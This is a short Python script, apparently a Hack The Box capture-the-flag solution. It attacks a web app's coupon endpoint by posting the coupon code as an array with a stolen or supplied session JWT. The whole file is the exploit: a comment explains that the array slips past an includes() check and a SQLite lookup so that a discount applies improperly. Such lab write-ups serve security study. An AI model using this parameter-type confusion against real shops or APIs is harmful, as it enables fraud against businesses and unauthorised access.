#!/usr/bin/python3

import requests

url = "http://IP:PORT/api/coupons/apply"

s = requests.session()

s.cookies.set("session", "YOUR_JWT", domain=url.split('/')[2])

# user.coupons.includes function uses ["HTB_100"] for comparison function @/api/coupons/apply sqlite looks for element inside the list
r = s.post(url, json={'coupon_code': ["HTB_100"]})

print(r.text)
print(r.cookies)
